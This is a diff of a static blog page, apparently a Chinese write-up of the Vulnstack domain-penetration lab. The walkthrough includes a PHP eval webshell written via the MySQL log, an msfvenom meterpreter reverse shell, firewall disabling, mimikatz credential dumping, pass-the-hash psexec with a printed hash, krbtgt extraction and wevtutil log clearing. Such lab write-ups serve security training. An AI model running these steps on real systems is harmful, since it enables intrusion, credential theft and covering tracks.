@@ -200,46 +200,46 @@
             
             <pre><code>    ## 靶场安装
 </code></pre>
-<h3 id="下载地址：漏洞详情"><a href="#下载地址：漏洞详情" class="headerlink" title="下载地址：漏洞详情"></a>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情</a></h3><h3 id="网络配置："><a href="#网络配置：" class="headerlink" title="网络配置："></a>网络配置：</h3><h4 id="win2k3"><a href="#win2k3" class="headerlink" title="win2k3"></a>win2k3</h4><p><img src="/source/images/Pasted%20image%2020261019200852.png"></p>
-<h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>这里一开始添加了一个网络适配器开自定义用来连接内网，我这台虚拟机好像给第一个网络适配器绑定了内网ip所以把第一个改成自定义(vmnet1),再添加一个网络适配器开nat模式用来连接外网。<br><img src="/source/images/Pasted%20image%2020261021195904.png"></p>
-<h4 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h4><p><img src="/source/images/Pasted%20image%2020261019201023.png"></p>
-<h4 id="phpstudy启动"><a href="#phpstudy启动" class="headerlink" title="phpstudy启动"></a>phpstudy启动</h4><p>靶场默认密码：hongrisec@2019<br>在c盘中启动phpstudy（第一次打开虚拟机需要重新启动一次）。<br><img src="/source/images/Pasted%20image%2020261021200153.png"></p>
+<h3 id="下载地址：漏洞详情"><a href="#下载地址：漏洞详情" class="headerlink" title="下载地址：漏洞详情"></a>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情</a></h3><h3 id="网络配置："><a href="#网络配置：" class="headerlink" title="网络配置："></a>网络配置：</h3><h4 id="win2k3"><a href="#win2k3" class="headerlink" title="win2k3"></a>win2k3</h4><p><img src="/images/Pasted%20image%2020261019200852.png"></p>
+<h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>这里一开始添加了一个网络适配器开自定义用来连接内网，我这台虚拟机好像给第一个网络适配器绑定了内网ip所以把第一个改成自定义(vmnet1),再添加一个网络适配器开nat模式用来连接外网。<br><img src="/images/Pasted%20image%2020261021195904.png"></p>
+<h4 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h4><p><img src="/images/Pasted%20image%2020261019201023.png"></p>
+<h4 id="phpstudy启动"><a href="#phpstudy启动" class="headerlink" title="phpstudy启动"></a>phpstudy启动</h4><p>靶场默认密码：hongrisec@2019<br>在c盘中启动phpstudy（第一次打开虚拟机需要重新启动一次）。<br><img src="/images/Pasted%20image%2020261021200153.png"></p>
 <h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>先用nmap对当前网段进行存活主机扫描。</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -sn 192.168.179.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021201003.png"></p>
+<p><img src="/images/Pasted%20image%2020261021201003.png"></p>
 <p>发现目标主机，进行端口扫描看一下开启了什么服务。</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 192.168.179.143<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021201224.png"></p>
+<p><img src="/images/Pasted%20image%2020261021201224.png"></p>
 <p>用dirseach对80端口进行扫描。</p>
 <pre class="line-numbers language-none"><code class="language-none">dirsearch -u 192.168.179.143:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021201849.png"></p>
-<p>扫描到后台，打开浏览器查看一下。<br><img src="/source/images/Pasted%20image%2020261021202003.png"></p>
-<p>尝试弱密码root&#x2F;root，成功进入后台<br><img src="/source/images/Pasted%20image%2020261021202107.png"></p>
+<p><img src="/images/Pasted%20image%2020261021201849.png"></p>
+<p>扫描到后台，打开浏览器查看一下。<br><img src="/images/Pasted%20image%2020261021202003.png"></p>
+<p>尝试弱密码root&#x2F;root，成功进入后台<br><img src="/images/Pasted%20image%2020261021202107.png"></p>
 <p>这里得想办法拿到shell，查询历史版本没有查到漏洞，只能用phpmyadmin去利用mysql写日志写马。</p>
 <pre class="line-numbers language-none"><code class="language-none">show global variables like &#39;%general%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>查看一下日志是否开启。<br><img src="/source/images/Pasted%20image%2020261021202837.png"></p>
-<p><img src="/source/images/Pasted%20image%2020261021203337.png"></p>
+<p>查看一下日志是否开启。<br><img src="/images/Pasted%20image%2020261021202837.png"></p>
+<p><img src="/images/Pasted%20image%2020261021203337.png"></p>
 <p>这里显示关闭状态，先把日志打开。</p>
 <pre class="line-numbers language-none"><code class="language-none">set global general_log&#x3D;&#39;on&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021203221.png"></p>
+<p><img src="/images/Pasted%20image%2020261021203221.png"></p>
 <p>查看mysql路径。</p>
 <pre class="line-numbers language-none"><code class="language-none">select @@basedir;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021203552.png"><br>设置木马路径。</p>
+<p><img src="/images/Pasted%20image%2020261021203552.png"><br>设置木马路径。</p>
 <pre class="line-numbers language-none"><code class="language-none">set global general_log_file &#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021203711.png"></p>
+<p><img src="/images/Pasted%20image%2020261021203711.png"></p>
 <p>写入shell。</p>
 <pre class="line-numbers language-none"><code class="language-none">select &quot;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261021203835.png"></p>
-<p>用蚁剑连接shell。<br><img src="/source/images/Pasted%20image%2020261022193650.png"></p>
-<p>whoami查看一下权限。<br><img src="/source/images/Pasted%20image%2020261022194752.png"></p>
+<p><img src="/images/Pasted%20image%2020261021203835.png"></p>
+<p>用蚁剑连接shell。<br><img src="/images/Pasted%20image%2020261022193650.png"></p>
+<p>whoami查看一下权限。<br><img src="/images/Pasted%20image%2020261022194752.png"></p>
 <p>先把防火墙关了避免影响到后面的步骤。</p>
 <pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261022195002.png"></p>
+<p><img src="/images/Pasted%20image%2020261022195002.png"></p>
 <p>因为webshell难以支持内网横向移动的要求，所以这里需要利用webshell在win7主机创建一个Meterpreter 反向 Shell。</p>
 <p>用msfvenom创建一个shell文件。</p>
 <pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter_reverse_tcp lhost&#x3D;192.168.179.135  lport&#x3D;5566 -f exe -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261022204035.png"></p>
-<p>用蚁剑上传到win7。<br><img src="/source/images/Pasted%20image%2020261022204008.png"><br>在kali上建立监听端口。</p>
+<p><img src="/images/Pasted%20image%2020261022204035.png"></p>
+<p>用蚁剑上传到win7。<br><img src="/images/Pasted%20image%2020261022204008.png"><br>在kali上建立监听端口。</p>
 <pre class="line-numbers language-none"><code class="language-none">msfconsole
 
 use exploit&#x2F;multi&#x2F;handler
@@ -249,26 +249,26 @@ set lport 5566
 run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>要去蚁剑里面用命令让shell.exe运行起来，打开蚁剑找到上传shell.exe的目录。</p>
 <pre class="line-numbers language-none"><code class="language-none">start shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261022205901.png"><br><img src="/source/images/Pasted%20image%2020261022205929.png"></p>
+<p><img src="/images/Pasted%20image%2020261022205901.png"><br><img src="/images/Pasted%20image%2020261022205929.png"></p>
 <p>成功连接到win7中的shell.exe。</p>
 <pre class="line-numbers language-none"><code class="language-none">sessions -i 1     #进入会话1
 
 shell             #使用shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261022210221.png"></p>
+<p><img src="/images/Pasted%20image%2020261022210221.png"></p>
 <p>先判断是否存在域</p>
 <pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028151503.png"><br>发现存在域，god.org,接下来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息。先解决shell回显会乱码的问题，chcp 65001把 cmd 的输出代码页切成 UTF-8，与 msfconsole 终端对齐，中文就能正常显示。</p>
+<p><img src="/images/Pasted%20image%2020261028151503.png"><br>发现存在域，god.org,接下来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息。先解决shell回显会乱码的问题，chcp 65001把 cmd 的输出代码页切成 UTF-8，与 msfconsole 终端对齐，中文就能正常显示。</p>
 <pre class="line-numbers language-none"><code class="language-none">chcp 65001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>再执行</p>
 <pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028152256.png"></p>
-<p>查看一下有几个域。<br><img src="/source/images/Pasted%20image%2020261028152432.png"></p>
+<p><img src="/images/Pasted%20image%2020261028152256.png"></p>
+<p>查看一下有几个域。<br><img src="/images/Pasted%20image%2020261028152432.png"></p>
 <p>发现只有god一个域，查一下域控主机名。</p>
 <pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028153259.png"></p>
+<p><img src="/images/Pasted%20image%2020261028153259.png"></p>
 <p>ping一下域控主机域名OWA.god.org，拿到主控域名的IP地址。</p>
 <pre class="line-numbers language-none"><code class="language-none">ping OWA.god.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028153445.png"></p>
+<p><img src="/images/Pasted%20image%2020261028153445.png"></p>
 <p>现在做的信息收集是利用shell在win7上进行的，接下来建立路由让攻击机也能够访问内网，先退回到msf。</p>
 <pre class="line-numbers language-none"><code class="language-none">exit           #退到meterpreter &gt;
 
@@ -277,15 +277,15 @@ background     #退到msf&gt;<span aria-hidden="true" class="line-numbers-rows">
 <pre class="line-numbers language-none"><code class="language-none">route add 192.168.52.0&#x2F;24 会话id
 
 route print    #检查路由是否生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028160034.png"><br>再建立socks代理。</p>
+<p><img src="/images/Pasted%20image%2020261028160034.png"><br>再建立socks代理。</p>
 <pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxy
 set SRVPORT 1080
 set VERSION 5
 run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028160104.png"></p>
+<p><img src="/images/Pasted%20image%2020261028160104.png"></p>
 <p>现在可以在内网使用nmap等工具了，先对域控进行nmap扫描。</p>
 <pre class="line-numbers language-none"><code class="language-none">nmap -sV -p 88,389,445,3389,5985 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028160258.png"></p>
+<p><img src="/images/Pasted%20image%2020261028160258.png"></p>
 <p>这里显示filtered，换种方式用msf自带的tcp扫描器扫一遍端口。</p>
 <pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp
 set RHOSTS 192.168.52.138
@@ -298,29 +298,29 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 set RHOSTS 192.168.52.138
 set PORTS 88,389,445,3389
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028201526.png"></p>
+<p><img src="/images/Pasted%20image%2020261028201526.png"></p>
 <p>进行版本探测。</p>
 <pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version
 set RHOSTS 192.168.52.138
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028201701.png"></p>
+<p><img src="/images/Pasted%20image%2020261028201701.png"></p>
 <p>返回会话3，启动kiwi提取凭据。</p>
 <pre class="line-numbers language-none"><code class="language-none">sessions -i 3
 load kiwi
 creds_all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028202117.png"></p>
-<p>还没拿到system，权限不够，之前已经拿到Administrator了，所以直接getsystem应该可以拿到system。<br><img src="/source/images/Pasted%20image%2020261028202504.png"><br>这里还有问题，Meterpreter 载荷是 32 位，32 位的 Kiwi 模块无法读取 64 位进程，这里得给他迁移到64位进程，用ps命令找一个x64的进程。</p>
+<p><img src="/images/Pasted%20image%2020261028202117.png"></p>
+<p>还没拿到system，权限不够，之前已经拿到Administrator了，所以直接getsystem应该可以拿到system。<br><img src="/images/Pasted%20image%2020261028202504.png"><br>这里还有问题，Meterpreter 载荷是 32 位，32 位的 Kiwi 模块无法读取 64 位进程，这里得给他迁移到64位进程，用ps命令找一个x64的进程。</p>
 <pre class="line-numbers language-none"><code class="language-none">migrate 你想迁移的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028203115.png"></p>
-<p><img src="/source/images/Pasted%20image%2020261028203146.png"></p>
-<p>再跑一次kiwi拿凭证。<br><img src="/source/images/Pasted%20image%2020261028203411.png"></p>
+<p><img src="/images/Pasted%20image%2020261028203115.png"></p>
+<p><img src="/images/Pasted%20image%2020261028203146.png"></p>
+<p>再跑一次kiwi拿凭证。<br><img src="/images/Pasted%20image%2020261028203411.png"></p>
 <p>用impacket-psexec创建shell连接，要走之前创的socks不然走不通。</p>
 <pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-psexec god.org&#x2F;Administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:d66092bee9345cd31e42ed5b70ebc6d7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/source/images/Pasted%20image%2020261028205948.png"></p>
+<p><img src="/images/Pasted%20image%2020261028205948.png"></p>
 <p>获取krbtgt哈希，重新打开新的终端输入。</p>
 <pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-secretsdump god.org&#x2F;Administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:d66092bee9345cd31e42ed5b70ebc6d7 -just-dc-user krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/source/images/Pasted%20image%2020261028211209.png"></p>
+<p><img src="/images/Pasted%20image%2020261028211209.png"></p>
 <h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><p>这里可以执行下面的命令进行痕迹清除。</p>
 <pre class="line-numbers language-none"><code class="language-none">wevtutil cl security               &#x2F;&#x2F; 清理安全日志
 wevtutil cl system                 &#x2F;&#x2F; 清理系统日志
@@ -342,12 +342,12 @@ wevtutil cl Setup                  &#x2F;&#x2F; 清除 Setup 事件日志<span a
         
         <span class="tag">
             
-            <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ffa2c4">靶机</a>
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ff7d73">靶机</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #ff7d73">渗透</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #00bcd4">渗透</a>
         </span>
         
     </div>
@@ -454,7 +454,7 @@ sudo git help config
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #00bcd4">渗透</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #ffa2c4">渗透</a>
         </span>
         
     </div>
@@ -625,12 +625,12 @@ mysql -udbuser -pR0ck3t
         
         <span class="tag">
             
-            <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ffa2c4">靶机</a>
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #ff7d73">靶机</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #03a9f4">渗透</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #ffa2c4">渗透</a>
         </span>
         
     </div>
@@ -685,7 +685,7 @@ mysql -udbuser -pR0ck3t
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
         </span>
         
         <span class="tag">
@@ -695,7 +695,7 @@ mysql -udbuser -pR0ck3t
         
         <span class="tag">
             
-            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" style="color: #ff7d73">信息泄漏</a>
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/" style="color: #00bcd4">信息泄漏</a>
         </span>
         
     </div>
@@ -763,12 +763,12 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="color: #ffa2c4">验证码</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" style="color: #00a596">验证码</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
         </span>
         
     </div>
@@ -829,7 +829,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
     </div>
